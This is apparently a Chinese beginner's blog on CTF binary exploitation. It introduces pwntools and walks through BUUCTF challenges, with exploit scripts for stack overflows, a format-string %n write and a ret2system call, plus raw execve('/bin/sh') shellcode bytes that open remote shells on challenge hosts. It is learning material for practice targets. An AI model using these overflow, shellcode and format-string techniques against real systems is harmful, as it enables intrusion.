# pwn入门



## 做题思路



找危险函数，或者上传危险函数覆盖







## pwntools的使用

**Pwntools** 是一个用于漏洞利用和二进制分析的 `Python 库`

`pwntools`可以说是pwn手必备的工具，它帮助pwn手`连接远程服务器`，`发送信息`，`接收信息`，以及提供了很多工具来帮助pwn手快速攻克题目



安装：

```
>>> apt-get update
>>> apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
>>> python3 -m pip install --upgrade pip
>>> python3 -m pip install --upgrade pwntools
```



直接cmd里面执行

```
pip install pwntools
```





### 导入pwntools

```py
from pwn import *
```



### 需要分清楚靶机的具体信息，不然无法连接

比如：

```python
context(os='linux', arch='AMD64', log_level='debug')
```



### 连接靶机具体ip和端口号：   nc连接

```python
用于连接远程服务器，并把连接到的进程命名为p，后续的函数都围绕这个p进程展开
p = remote("ip",port) 
比如:p = remote("node5.buuoj.cn",5555)
```



如果用ssh连接，则：

```python
通过使用ssh来连接靶机
p = ssh(host='192.168.xx.xxx', user='xidp', port=6666, password='88888888')
```



### 发送信息：

```python
**************************************************
p.send(payload) # 直接发送payload
**************************************************
p.sendline(payload) # 发送payload，但是结尾会有一个\n
**************************************************
p.sendafter("string", payload) # 接收到 string (这里说的string可以替换成任何信息) 之后会发送payload，但是如果没有接收到string，那么就会导致脚本一直卡在这里不动
**************************************************
p.sendlineafer("string", payload) # 接收到 string 之后会发送payload 并且在payload最后添加\n
```

tips:

如果函数是`gets()`和`scanf()`这类函数它们会以`\n`作为结束符号，这时候就需要我们手动发送`\n` 不然函数无法结束，这时候就需要使用`p.sendline(payload) ` 



如果函数是`read()` 这类的函数，使用`p.sendline`和`p.send`都可以,但是需要区分不同情况





### 接受信息：

```python
p.recv(int) 利用recv来接收返回的数据，并且可以控制接受到的字节数
比如:p.recv(7) => 系统输出'hello world' => 我们会接受到'hello w' 

p.recvline('string') 设置一个标识符，接收标识符所在的那一行
比如:p.recvline('O.o')
#系统输出:
Hello World 
This is a test. 
O.o This is the target line. 
Goodbye.
#我们接收:
O.o This is the target line. 
**************************************************
p.recvlines(N) 接收 N 行输出
**************************************************
p.recvuntil('string') 可以指定接收到某一字符串的时候停止 ,还有第二个参数 drop，drop=True(默认为false) 表示丢弃设定的停止符号
比如:p.recvuntil('or') 
#系统输出:
hello world 
#我们接收:
hello wor  
比如:a = io.recvuntil(']', drop=True)
就是一直获取到`]`符号出现就停止，并且不接收`]`符号
**************************************************
```



只有信息多才需要使用这个



### 构造发送地址类型

#### `p64/p32/u64/u32`这类函数的作用:

```python
**************************************************
p64(int) 
p64(0xfaceb00c) => '\x0c\xb0\xce\xfa\x00\x00\x00\x00\x00'
**************************************************
u64(str) 
u64('\x0c\xb0\xce\xfa\x00\x00\x00\x00') =>0xfaceb00c
**************************************************
p32(int)  
p32(0xfaceb00c) => '\x0c\xb0\xce\xfa'
**************************************************
u32(str) 
u32('\x0c\xb0\xce\xfa') => 0xfaceb00c
**************************************************

```







### 传递到终端

```python
p.interactive()
接受信息并且在终端操作，程序拿到shell
```





### 一个最基本的payload如下：

```python
from pwn  import *
import pwnlib
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')

if __name__ == '__main__':
	
	HOST = 'node4.buuoj.cn'
	PORT = 29105
	conn = remote(HOST ,PORT)
	payload = "A"*0x17 + p64(0x40118A)
	conn.sendline(payload)
	conn.interactive()
```



### 汇编与反汇编



```python
>>> asm('mov eax, 0')   #汇编
'\xb8\x00\x00\x00\x00'

>>> disasm('\xb8\x0b\x00\x00\x00')  #反汇编
'mov    eax,0xb'
```



### shellcode

```python
context(os='linux', arch='i386')
# 表示将当前执行上下文的体系结构设置为i386(这里的i386可以通过checksec来查看文件是什么架构的  
shellcode = asm(shellcraft.sh())
# asm()是把括号内的内容编译成机器码(只有机器码才可以执行)，一般用来打入后门。pwntools自带的后门函数，可以生成类似system('/bin/sh/')这样功能的汇编代码 
# 通常可以配合  .ljust() 来使用  
shellcode.ljust(112, b'A')  
# 这里的 .ljust() 是 Python 中字符串对象的方法，用于在字符串的右侧填充指定的字符，使字符串达到指定的长度。

```



```python
from pwn import *
context(arch='i386', os='linux')
shellcode = asm(shellcraft.sh())
shellcode.ljust(112, b'A')  
```



如果不用库自带的shellcode，可以有一些编译好的shellcode



64位Linux的24Byte的ShellCode：

```
shellcode_x64 ="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
```



64位Linux的23Byte的shellcode：

```
shellcode_x64 ="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```







### 报错问题：

#### 1.使用p64()时报错：TypeError: can only concatenate str (not “bytes“) to str

```python
p64(0x00400596).decode('unicode_escape')
```







## 题目

### rip



危险函数：

![image-20241027095812449](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027095812449.png)

可以看到很明显的 `"/bin/sh"` ,然后看ida下面的地址 `0x0040118A`



然后再看main函数里面的gets，获取用户输入参数的s，已知s为char型，并且为15位，

所以构造思路应该是15位装满，再加跳到返回函数中，恰好为fun函数入口

![image-20241027100826159](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027100826159.png)





```python
from pwn import *

p = remote('node3.buuoj.cn', 28957)

#payload = 'a' * (0xf + 0x8) + p64(0x401198) + p64(0x401186) 也可以，是网上wp的修改
payload = 'a' * 15 + p64(0x401186).decode('unicode_escape')

p.sendline(payload)

p.interactive()

```





但是后续还是建议直接用偏移量算入口指令，而不是入口函数来算



### warmup_csaw_2016

![image-20241027102225564](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027102225564.png)

可以看到我们输入的地方就是v5，然后v5有64位char型，双击进入stack

![image-20241027102316895](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027102316895.png)

看到偏移8位就可以到返回函数

然后再看到我们需要注意的地方cat flag.txt

![image-20241027102421576](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027102421576.png)

指令入口为 ：  `0x00400611`

至此，可以写payload如下：

```python
from pwn import *

p = remote('node5.buuoj.cn', 28758)

payload = 'a' * (64+8) + p64(0x00400611).decode('unicode_escape')

p.sendline(payload)

p.interactive()
```



### ciscn_2019_n_1



还是一样思考

找危险函数在哪：

![image-20241027103445184](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027103445184.png)

本题没有直接的危险函数可以接触了，而是通过v2的值判断来进入，但是我们并不能直接修改v2的值，而是修改v1的值，所以应该能猜测，v1溢出，然后将v2的值改为11.28125



双击点v1的值，顺带v2的也出来了

![image-20241027104739162](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027104739162.png)

所以可以看到v1是0x30，v2是0x04

所以填满v1再加上偏移量11.28125即可，只不过11.28125需要转换为十六进制，仔细在View-A里面找，也是直接有的：

![image-20241027104923654](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027104923654.png)



故最终的exp：

```python
from pwn import *

p = remote('node5.buuoj.cn', 26100)

payload = 'a' * (0x30 - 0x04) + p64(0x41348000).decode('unicode_escape')

p.sendline(payload)

p.interactive()
```



### pwn1_sctf_2016

拉进die查看，发现是32位的，直接ida32启动！

查看危险函数，cat flag.txt

![image-20241027110925387](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027110925387.png)

指令入口地址为 ： `0x08048F13`



找我们能操作的变量是啥：

![image-20241027111023159](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027111023159.png)

可以看到fgets 就是s这个变量

但值得注意的是，下面的函数有replace，会将我们传进去的I变为you，所以计算需要注意

双击S，可以看到

![image-20241027111139124](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027111139124.png)



然后要直接溢出到末尾：

![image-20241027111212796](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027111212796.png)



如果是看vuln函数里面的32，就溢出到下一个变量，而我们需要溢出到返回函数里头

所以就是0x3C / 3 个 ”I“   然后会被替换成 0x3C 个 ”you“

此时来到了0x04这个地方，我们再填入4个'a'

就可以溢出了。

最终的payload为： 

```python
from pwn import *

p = remote('node5.buuoj.cn', 29315)

payload = 'I' * 20  + 'a' * 4 + p32(0x08048F13).decode('unicode_escape')

p.sendline(payload)

p.interactive()
```



### jarvisoj_level0



危险函数地址：

![image-20241027114441105](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027114441105.png)



能操作的地址：

![image-20241027114515968](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027114515968.png)





最终exp：

```python
from pwn import *

p = remote('node5.buuoj.cn', 26231)

payload = 'a' * (128+8)  + p64(0x0040059A).decode('unicode_escape')

p.sendline(payload)

p.interactive()
```





### [第五空间2019 决赛]PWN5

难度上升了，有两种思路解决



main函数里面可以看到对read等函数进行了限制：
![image-20241027151614333](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027151614333.png)



这里的考点就是使用格式化输出进行溢出

这里需要前置知识点

%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置

例如：printf("0x44444444%2$n")意思就是说在打印出0x4444这个字符后，将“0x44444444”所输入的字符数量（此处是4）写入到%2$n所指的地址中.



可以看到主要逻辑就是程序随便取一个数，然后你上传用户名字，然后密码要和程序取的随机数要一样，才能够执行系统函数



![image-20241027151801312](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027151801312.png)

已知这个随机数存储在 `0x0804C044` 



然后我们看一下printf出来的地址在哪里？

![image-20241027152103572](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027152103572.png)



a小写字母为61，所以输出就是61616161

那就数数嘛，一个.为分隔符

然后数到10

所以可以肯定后面就是 `%10$n`



然后密码部分就和 `dword_804C044` 

```python
from pwn import *

r=remote('node5.buuoj.cn',29211)

target=0x804c044
pay=p32(target)+b'%10$n'        

r.recvuntil(':')
r.sendline(pay)

r.recvuntil(':')
r.sendline(str(4))     #写入了四字节，因此此处应写入4

r.interactive()
```





### jarvisoj_level2



main函数找危险函数入口，可惜没有，但是找到唯一可以传进去的值就是buf

![image-20241027161059937](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027161059937.png)



虽然read有做输入限制，但是0x100 - 0x80 还是有空间来进行溢出的



搜索字符串，可以发现一个/bin/sh

![image-20241027161356876](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027161356876.png)

但是可以发现他不是直接执行的，猜测就是有个system函数溢出调用这个地址的数据作为命令执行

跳转system函数



![image-20241027161318265](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027161318265.png)



![image-20241027161507271](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027161507271.png)

可以看到两个关键的地址



还是老规矩溢出buf

![image-20241027161558612](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027161558612.png)

最后的payload：注意一点就是顺序绝对不能变化，因为溢出是有顺序的，思路就是buf溢出到返回函数，然后调用到system函数的地址，然后执行的数据在hint里面，那个p32(0)，里面的数据可以是任意的

因为：32位的分布是这样子的，返回地址+下一次的返回地址+参数1+参数2+...这样子因为我们下一次返回地址是啥都行，我们拿到shell就跑了，所以直接为0



最终exp：

```python
from pwn import *

r = remote('node5.buuoj.cn',29222)

hint = 0x804A024
system = 0x8048320

payload = 'a' * (0x88 + 0x04) + (p32(system) + p32(0) + p32(hint)).decode('unicode_escape')

r.sendline(payload)

r.interactive()
```



### ciscn_2019_n_8

点开main函数：

![image-20241027163853652](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027163853652.png)

惊讶发现var是个全局变量，没在main里面定义，双击查看

bss静态存储区，那我们不能跳了

![image-20241027164039257](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027164039257.png)



再看main函数后面的，发现他只是一个简单的比较就可以拿到shellcode了

```
*(_QWORD *)&var[13] == 0x11LL
```

发现：
qword全称是Quad Word

2个字节就是1个Word（1个字，16位）

q就是英文quad-这个词根（意思是4）的首字母

所以它自然是word（2字节，0~2^16-1）的四倍，8字节

所以前13位要为'aaaa'，4倍



最终exp：

```python
from pwn import *

r = remote('node5.buuoj.cn',25756)

payload = 'a' * (13*4)   +  (p32(0x11) + p32(0)).decode('unicode_escape')

r.sendline(payload)

r.interactive()
```



### bjdctf_2020_babystack

同理：main函数：



![image-20241027165011249](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027165011249.png)

可以发现这里有两个可以上传的值，一个是nbytes，用来限制保护后面传的buf，但是它可以被我们控制，所以我们应该直接传最大值，啥都不管。

然后看到buf才是我们主要用的

双击可以看到：

![image-20241027165131245](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027165131245.png)

要溢出到返回函数那里去，大小就是0x10 + 0x08 



然后看到有个backdoor函数，看他的地址即可：

![image-20241027165238295](https://gitee.com/autojiangxiao/blogimg/raw/master/img/image-20241027165238295.png)

溢出到入口函数也是可以的，看你喜欢



然后最终exp为：

```python
from pwn import *

r = remote('node5.buuoj.cn',29674)

backdoor = 0x004006EA

payload = 'a' * (0x10 + 0x08)   +  (p64(backdoor)).decode('unicode_escape')

r.sendline(str(255))

r.recvuntil('?')
r.sendline(payload)
r.interactive()
```







